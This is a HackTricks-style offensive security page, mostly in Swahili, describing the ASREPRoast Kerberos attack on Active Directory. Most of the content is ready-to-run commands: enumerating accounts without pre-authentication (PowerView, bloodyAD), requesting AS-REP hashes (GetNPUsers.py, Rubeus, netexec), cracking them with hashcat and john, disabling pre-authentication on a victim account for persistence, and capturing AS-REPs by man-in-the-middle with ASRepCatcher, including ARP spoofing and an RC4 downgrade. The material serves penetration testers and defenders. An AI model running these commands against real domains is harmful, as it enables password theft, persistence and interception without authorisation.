# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji wasiokuwa na **Kerberos pre-authentication required attribute**. Kwa msingi, udhaifu huu unawawezesha wadukuzi kuomba authentication kwa mtumiaji kutoka kwa Domain Controller (DC) bila ya kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliosimbwa kwa ufunguo uliotokana na nenosiri la mtumiaji, ambao wadukuzi wanaweza kujaribu kuvunja kwa njia isiyokuwa mtandaoni ili kugundua nenosiri la mtumiaji.

Mahitaji makuu kwa shambulio hili ni:

- **Lack of Kerberos pre-authentication**: Watumiaji lengwa hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
- **Connection to the Domain Controller (DC)**: Wadukuzi wanahitaji ufikiaji kwa DC kutuma maombi na kupokea ujumbe uliosimbwa.
- **Optional domain account**: Kuwa na akaunti ya domain kunawawezesha wadukuzi kutambua watumiaji walio hatarini kwa ufanisi zaidi kupitia LDAP queries. Bila akaunti kama hiyo, wadukuzi lazima wakisie majina ya watumiaji.

#### Kuhesabu watumiaji walio hatarini (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus itatengeneza 4768 yenye aina ya usimbuaji 0x17 na preauth type of 0.

#### Mistari mifupi ya haraka (Linux)

- Tambua malengo yanayowezekana kwanza (kwa mfano, kutoka leaked build paths) kwa kutumia Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Piga AS-REP ya mtumiaji mmoja hata ukiwa na nenosiri **bila** ukitumia `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec pia inaonyesha LDAP signing/channel binding posture).
- Crack with `hashcat out.asreproast /path/rockyou.txt` – inaigundua kiotomatiki **-m 18200** (etype 23) kwa AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Uendelevu

Weka **preauth** isihitajike kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika properties):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

Mshambuliaji anaweza kutumia nafasi ya man-in-the-middle kukamata AS-REP packets zinapopita kwenye mtandao bila kutegemea kwamba Kerberos pre-authentication imezimwa. Hivyo basi inafanya kazi kwa watumiaji wote kwenye VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatuwezesha kufanya hivyo. Zaidi ya hayo, zana hiyo inalazimisha client workstations kutumia RC4 kwa kubadilisha Kerberos negotiation.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
